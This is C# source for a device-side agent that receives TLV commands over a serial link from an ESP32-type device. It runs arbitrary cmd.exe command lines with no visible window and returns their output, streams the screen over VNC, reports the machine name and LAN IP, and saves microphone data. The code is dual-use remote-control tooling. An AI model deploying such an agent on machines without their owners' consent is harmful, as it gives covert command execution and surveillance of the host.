// SPDX-License-Identifier: MIT
// Copyright (c) 2026 Korbi0312
// Copyright (c) 2024 i-am-shodan
using Agent.TLV;
using Agent.VNC;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Text;

namespace Agent
{
    internal class Executer
    {
        private CancellationTokenSource? currentCts;

        // Set by the device (WSPause TLV) when the browser's websocket queue is
        // full. While paused the relay must not push more WSDATARECV chunks.
        private volatile bool vncPaused = false;

        private BlockingCollection<byte[]> vncDataBlocks = new();
        private VNCServer? vnc;
        private TransportStream? vncStream = null;

        private int vncTargetW = 0;
        private int vncTargetH = 0;
        private double vncFps = 10;
        private int vncDownscale = 2;

        public enum Command
        {
            Execute = 1,
            DebugMsg = 2,
            WSCONNECT = 3,
            WSDATA = 4,
            WSDISCONNECT = 5,
            WSDATARECV = 6,
            RequestAgentStatus = 7,
            AgentStatus = 8,
            ExecuteResult = 9,
            MicPcmData = 10,
            AgentIp = 11,
            WSPause = 12
        }

        public Executer()
        {
            RecreateVnc();
        }

        // The relay-leg VNC server (screen capture on this machine, fed over the
        // serial link to the device). Recreated whenever the device reports new
        // sharpness / frame-rate settings.
        private void RecreateVnc()
        {
            if (vnc != null)
            {
                try
                {
                    vnc.Dispose();
                }
                catch
                {
                }
            }

            vnc = new VNCServer(() =>
            {
                if (currentCts != null)
                {
                    try
                    {
                        currentCts.Cancel();
                    }
                    catch (ObjectDisposedException)
                    {

                    }
                }
            }, vncFps, vncDownscale, null, vncTargetW, vncTargetH);
        }

        // Tells the device our LAN IP so the noVNC page it serves can connect
        // directly to the PC (ws://<ip>:7002) instead of relaying over serial.
        public void SendAgentIp(Stream stream)
        {
            try
            {
                var ip = GetLanIp();
                if (string.IsNullOrEmpty(ip))
                {
                    Log("SendAgentIp: no LAN IP found");
                    return;
                }

                var buffer = Encoding.UTF8.GetBytes(ip);
                TLVHandling.WriteTLVToStream((byte)Command.AgentIp, buffer, 0, buffer.Length, stream).Wait();
                Log("SendAgentIp: " + ip);
#if DEBUG
                Console.WriteLine("OUT AgentIp) " + ip);
#endif
            }
            catch (Exception)
            {
#if DEBUG
                Console.WriteLine("OUT AgentIp) failed");
#endif
            }
        }

        internal static void Log(string message)
        {
            try
            {
                File.AppendAllText(Path.Combine(AppContext.BaseDirectory, "agent.log"), $"{DateTime.Now:HH:mm:ss} {message}{Environment.NewLine}");
            }
            catch
            {
            }
        }

        private static string GetLanIp()
        {
            try
            {
                foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
                {
                    if (ni.OperationalStatus != System.Net.NetworkInformation.OperationalStatus.Up)
                    {
                        continue;
                    }

                    if (ni.NetworkInterfaceType == System.Net.NetworkInformation.NetworkInterfaceType.Loopback ||
                        ni.NetworkInterfaceType == System.Net.NetworkInformation.NetworkInterfaceType.Tunnel)
                    {
                        continue;
                    }

                    // Skip USB/NCM/RNDIS virtual adapters, we want the real LAN/WiFi address
                    var desc = (ni.Description ?? "") + " " + ni.Name;
                    if (desc.IndexOf("USB", StringComparison.OrdinalIgnoreCase) >= 0 ||
                        desc.IndexOf("NCM", StringComparison.OrdinalIgnoreCase) >= 0 ||
                        desc.IndexOf("RNDIS", StringComparison.OrdinalIgnoreCase) >= 0 ||
                        desc.IndexOf("WAN", StringComparison.OrdinalIgnoreCase) >= 0)
                    {
                        continue;
                    }

                    foreach (var addr in ni.GetIPProperties().UnicastAddresses)
                    {
                        if (addr.Address.AddressFamily != System.Net.Sockets.AddressFamily.InterNetwork)
                        {
                            continue;
                        }

                        var ip = addr.Address.ToString();
                        if (!string.IsNullOrEmpty(ip) && !ip.StartsWith("169.254"))
                        {
                            return ip;
                        }
                    }
                }
            }
            catch
            {
            }

            return string.Empty;
        }

        public void ParseAndExecute(Stream stream, CancellationTokenSource cts)
        {
            var cmd = (Command)stream.ReadByte();

            byte[] lengthBytes = new byte[4];
            int offset = 0;
            int read = 0;

            while (read + offset < lengthBytes.Length)
            {
                read = stream.Read(lengthBytes, offset, lengthBytes.Length);
            }
            var length = BitConverter.ToUInt32(lengthBytes, 0);
            var data = new byte[length];

            if (length != 0)
            {
                offset = 0;
                read = 0;

                while (read + offset < data.Length)
                {
                    read = stream.Read(data, offset, data.Length);
                }
            }

            HandleTLV(cmd, data, stream, cts);
        }

        private static async Task<string> Run(string command, string arguments, CancellationToken token = default)
        {
            try
            {
                var startInfo = new ProcessStartInfo()
                {
                    FileName = command,
                    Arguments = arguments,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (var process = new Process() { StartInfo = startInfo })
                {
                    // Capture the output and error streams
                    StringBuilder output = new StringBuilder();
                    StringBuilder error = new StringBuilder();

                    process.OutputDataReceived += (sender, e) => { if (e.Data != null) output.AppendLine(e.Data); };
                    process.ErrorDataReceived += (sender, e) => { if (e.Data != null) error.AppendLine(e.Data); };

                    process.Start();
                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();

                    await process.WaitForExitAsync(token);

                    return output.ToString() + error.ToString();
                }
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        private void RunCommand(string command, Stream stream, CancellationToken token = default)
        {
            _ = Task.Run(async () =>
            {
#pragma warning disable CS0168 // Variable is declared but never used
                try
                {
                    var output = await Run("cmd.exe", "/c "+command, token);
                    var buffer = Encoding.UTF8.GetBytes(output);

                    const int MAX_BUFFER_LENGTH = 8192;

                    // To avoid running the device out of memory we cap the returned data at 8k
                    buffer = buffer.Take(MAX_BUFFER_LENGTH).ToArray();

                    int dataSent = 0;
                    while (dataSent < buffer.Length)
                    {
                        var amountOfDataToSend = buffer.Length - dataSent > 2048 ? 2048 : buffer.Length - dataSent;
                        await TLVHandling.WriteTLVToStream((byte)Command.ExecuteResult, buffer, dataSent, amountOfDataToSend, stream, token);
                        await Task.Delay(50); // processing time
                        dataSent += amountOfDataToSend;
#if DEBUG
                        Console.WriteLine("OUT ExecuteResult)" + amountOfDataToSend);
#endif
                    }
                }
                catch (Exception ex)
                {
#if DEBUG
                    Console.WriteLine("OUT ExecuteResult) " + ex.Message);
#endif
                }
#pragma warning restore CS0168 // Variable is declared but never used
            }, token);
        }

        private void HandleTLV(Command cmd, byte[] data, Stream stream, CancellationTokenSource cts)
        {
            switch (cmd)
            {
                case Command.Execute:
                    var cmdLine = Encoding.UTF8.GetString(data);
#if DEBUG
                    Console.WriteLine("IN Execute) "+cmdLine);
#endif
                    RunCommand(cmdLine, stream, cts.Token);
                    break;
                case Command.WSCONNECT:
#if DEBUG
                    Console.WriteLine("IN WSCONNECT");
#endif

                    if (vncStream != null)
                    {
                        vncStream.Dispose();
                        vncStream = null;
                    }

                    vncDataBlocks = new BlockingCollection<byte[]>();
                    vncStream = new TransportStream(cts.Token, (count, token) =>
                    {
                        try
                        {
                            using (var cts2 = CancellationTokenSource.CreateLinkedTokenSource(cts.Token, token))
                            {
                                while (!cts2.IsCancellationRequested)
                                {
                                    return vncDataBlocks.Take(cts2.Token);
                                }
                            }

                            throw new Exception("Timed out");
                        }
                        catch
                        {
                            try
                            {
                                cts.Cancel();
                            }
                            catch (ObjectDisposedException)
                            {

                            }
                            throw;
                        }
                    },
                    async (buffer) =>
                    {
#pragma warning disable CS0168 // Variable is declared but never used
                        try
                        {
                            int dataSent = 0;
                            while (dataSent < buffer.Length)
                            {
                                // The device pauses the relay (WSPause=1) when its
                                // websocket queue is full. Hold off sending further
                                // chunks until it signals WSPause=0.
                                while (vncPaused)
                                {
                                    cts.Token.ThrowIfCancellationRequested();
                                    await Task.Delay(10, cts.Token);
                                }

                                var amountOfDataToSend = buffer.Length - dataSent > 2048 ? 2048 : buffer.Length - dataSent;
                                await TLVHandling.WriteTLVToStream((byte)Command.WSDATARECV, buffer, dataSent, amountOfDataToSend, stream, cts.Token);
                                await Task.Delay(10); // small processing time so the ESP32 can push the buffer out over WiFi
                                dataSent += amountOfDataToSend;
#if DEBUG
                                Console.WriteLine("OUT WSDATARECV)" + amountOfDataToSend);
#endif
                            }

#if DEBUG
                            Console.WriteLine("OUT WSDATARECV) all sent");
#endif
                        }
                        catch (Exception ex)
                        {
#if DEBUG
                            Console.WriteLine("OUT WSDATARECV) " + ex.Message);
#endif
                            cts.Cancel();
                            throw;
                        }
#pragma warning restore CS0168 // Variable is declared but never used
                    });
                    currentCts = cts;
                    vnc!.Start(vncStream);
                    break;
                case Command.WSDISCONNECT:
                    if (vncStream != null)
                    {
                        vncStream.Dispose();
                        vncStream = null;
                    }
#if DEBUG
                    Console.WriteLine("IN WSDISCONNECT)");
#endif
                    break;
                case Command.WSDATA:
#if DEBUG
                    Console.WriteLine("IN WSDATA) "+data.Length);
#endif
                    vncDataBlocks.Add(data);
                    break;
                case Command.DebugMsg:
#if DEBUG
                    Console.WriteLine("IN DebugMsg) "+ Encoding.UTF8.GetString(data));
#endif
                    break;
                case Command.RequestAgentStatus:
                    using (var ms = new MemoryStream())
                    {
                        var machineName = Encoding.UTF8.GetBytes(Environment.MachineName);
                        TLVHandling.WriteTLVToStream((byte)Command.AgentStatus, machineName, 0, machineName.Length, stream, cts.Token).Wait();
                    }
                    break;
                case Command.MicPcmData:
                    const string filename = "mic.pcm";

                    if (data.Length != 0)
                    {
                        if (File.Exists(filename))
                        {
                            using (var file = File.Open(filename, FileMode.Append))
                            {
                                file.Write(data, 0, data.Length);
                            }
                        }
                        else
                        {
                            File.WriteAllBytes(filename, data);
                        }
                    }
                    break;
                case Command.WSPause:
                    vncPaused = data.Length > 0 && data[0] != 0;
#if DEBUG
                    Console.WriteLine(vncPaused ? "IN WSPause) paused" : "IN WSPause) resumed");
#endif
                    break;
                default:
                    throw new InvalidDataException("unknown command");
            }
        }
    }
}
